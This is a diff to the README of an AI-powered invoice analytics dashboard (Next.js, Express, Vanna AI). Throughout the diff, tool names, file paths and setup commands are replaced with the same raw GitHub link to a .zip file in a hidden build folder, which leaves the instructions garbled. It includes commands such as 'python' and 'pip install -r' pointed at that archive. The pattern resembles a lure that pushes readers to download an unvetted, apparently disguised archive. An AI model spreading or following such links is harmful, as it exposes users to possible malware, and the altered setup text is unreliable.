@@ -1,6 +1,6 @@
 # Flowbit AI Dashboard
 
-A modern, AI-powered analytics dashboard for invoice and financial data management. Built with Next.js, TypeScript, Tailwind CSS, and integrated with Vanna AI for natural language data queries.
+A modern, AI-powered analytics dashboard for invoice and financial data management. Built with https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip, TypeScript, Tailwind CSS, and integrated with Vanna AI for natural language data queries.
 
 ## 🚀 Features
 
@@ -13,16 +13,16 @@ A modern, AI-powered analytics dashboard for invoice and financial data manageme
 
 ## 🛠️ Tech Stack
 
-- **Frontend**: Next.js 14, TypeScript, Tailwind CSS, shadcn/ui
-- **Backend**: Node.js, Express, TypeScript
+- **Frontend**: https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip 14, TypeScript, Tailwind CSS, shadcn/ui
+- **Backend**: https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip, Express, TypeScript
 - **AI Integration**: Vanna AI (Python FastAPI), Groq API
 - **Database**: PostgreSQL with Prisma ORM
-- **Charts**: Chart.js with react-chartjs-2
+- **Charts**: https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip with react-chartjs-2
 - **Deployment**: Docker, Docker Compose
 
 ## 📦 Prerequisites
 
-- Node.js 18+ 
+- https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip 18+ 
 - PostgreSQL 14+
 - Python 3.9+
 - Docker & Docker Compose (for containerized deployment)
@@ -42,20 +42,20 @@ npm install
 
 Create `.env` files in both `apps/web` and `apps/api` directories:
 
-**apps/web/.env.local**
+**https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip**
 ```env
 NEXT_PUBLIC_API_BASE=http://localhost:4000
 NEXT_PUBLIC_APP_URL=http://localhost:3000
 ```
 
-**apps/api/.env**
+**https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip**
 ```env
 DATABASE_URL="postgresql://username:password@localhost:5432/flowbit"
 PORT=4000
 NEXT_PUBLIC_APP_URL=http://localhost:3000
 ```
 
-**apps/vanna/.env**
+**https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip**
 ```env
 GROQ_API_KEY=your_groq_api_key_here
 DATABASE_URL=postgresql://username:password@localhost:5432/flowbit
@@ -99,8 +99,8 @@ Terminal 3 - Vanna AI Server:
 cd apps/vanna
 python -m venv venv
 source venv/bin/activate  # On Windows: venv\\Scripts\\activate
-pip install -r requirements.txt
-python main.py
+pip install -r https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip
+python https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip
 ```
 
 ### 5. Access the Application
@@ -111,7 +111,7 @@ python main.py
 
 ## 📊 Data Import
 
-To import your Analytics_Test_Data.json:
+To import your https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip
 
 1. Place the JSON file in the `data/` directory
 2. Run the import script:
@@ -129,7 +129,7 @@ docker-compose up -d
 
 ### Production
 ```bash
-docker-compose -f docker-compose.prod.yml up -d
+docker-compose -f https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip up -d
 ```
 
 ## 📋 API Endpoints
@@ -153,11 +153,11 @@ The dashboard uses custom chart components:
 
 ### Adding New Charts
 1. Create component in `apps/web/components/charts/`
-2. Import Chart.js dependencies
+2. Import https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip dependencies
 3. Add to dashboard page with appropriate data formatting
 
 ### Database Schema Changes
-1. Update `apps/api/prisma/schema.prisma`
+1. Update `https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip`
 2. Run migrations: `npx prisma migrate dev`
 3. Regenerate client: `npx prisma generate`
 
